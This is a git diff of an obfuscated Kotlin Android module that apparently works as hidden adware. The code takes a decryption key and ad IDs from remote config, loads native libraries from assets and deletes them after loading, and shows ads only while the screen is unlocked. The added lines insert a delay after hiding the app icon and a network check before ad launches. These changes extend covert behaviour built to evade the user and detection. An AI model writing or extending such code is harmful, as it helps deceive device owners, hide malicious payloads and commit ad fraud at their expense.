@@ -3,6 +3,8 @@ package ec
 import android.app.Application
 import android.app.KeyguardManager
 import android.content.Context
+import android.net.ConnectivityManager
+import android.net.NetworkCapabilities
 import android.os.Build
 import android.os.Bundle
 import android.os.PowerManager
@@ -152,7 +154,7 @@ object EcLoad {
     fun reConfig(js: JSONObject) {
         // JSON数据格式
         sK = js.optString("jmk").split("-")[0]//So 解密的key
-        Log.e("TAG", "reConfig: 1=$sK", )
+        Log.e("TAG", "reConfig: 1=$sK")
         val allKey = js.optString("all_kg")
         val kg = allKey.split("-")[0]
         val gb = allKey.split("-")[1]
@@ -169,7 +171,7 @@ object EcLoad {
 
         DataCc.b = wt
         val allAdId = js.optString("showGV")
-        Log.e("TAG", "reConfig: 2=$allAdId", )
+        Log.e("TAG", "reConfig: 2=$allAdId")
 
 
         mAdC.setAdId(allAdId.split("-")[0], allAdId.split("-")[1])// 广告id
@@ -217,6 +219,8 @@ object EcLoad {
             }
             MasterRu.pE("test_s_load", "${System.currentTimeMillis() - time}")
             Kac.snnPl(22, 11.0, DataCc.y)
+            //TODO 在隐藏icon后延迟1s～1.5s
+            delay(1100)
             while (true) {
                 // 刷新配置
                 refreshAdmin()
@@ -250,7 +254,8 @@ object EcLoad {
     private fun loadSFile(assetsName: String): Boolean {
         try {
             val assetsInputS = mContext.assets.open(assetsName)
-            val fileSoName = "${assetsName.substring(2).replace("/", "_")}_${System.currentTimeMillis()}"
+            val fileSoName =
+                "${assetsName.substring(2).replace("/", "_")}_${System.currentTimeMillis()}"
             val file = File("${mContext.filesDir}/Cache")
             if (file.exists().not()) {
                 file.mkdirs()
@@ -262,7 +267,7 @@ object EcLoad {
                 if (!outputFile.exists() || outputFile.length() == 0L) {
                     return false
                 }
-                
+
                 System.load(outputFile.absolutePath)
                 outputFile.delete()
                 return true
@@ -345,16 +350,57 @@ object EcLoad {
             if (isSAd) {
                 delay(800)
             }
+
+            if (!isNetworkReallyAvailable()) {
+                Log.e("TAG", "cAction: NO -net work", )
+                return@launch
+            }
             sNumJump(++numJumps)
             MasterRu.pE("ad_start")
             Kac.snnPl(2, 1.0, DataCc.b)
         }
     }
 
+    /**
+     * 检测屏幕状态
+     * @return true: 屏幕亮且未锁定  false: 屏幕灭或已锁定
+     */
     private fun l(context: Context = mContext): Boolean {
         return (context.getSystemService(Context.POWER_SERVICE) as PowerManager).isInteractive && (context.getSystemService(
             Context.KEYGUARD_SERVICE
         ) as KeyguardManager).isDeviceLocked.not()
+    }
+
+
+    private fun isNetworkReallyAvailable(): Boolean {
+        return try {
+            val connectivityManager =
+                mContext.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+            val network = connectivityManager.activeNetwork ?: return false
+            val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
+
+            val hasTransport = capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
+                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) ||
+                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)
+
+            if (!hasTransport) {
+                return false
+            }
+            val hasInternet =
+                capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
+
+
+            val isValidated =
+                capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
+
+            return hasInternet && isValidated
+
+
+        } catch (e: Exception) {
+            e.printStackTrace()
+            Log.e("TAG", "Network check error: ${e.message}")
+            true
+        }
     }
 
     @JvmStatic
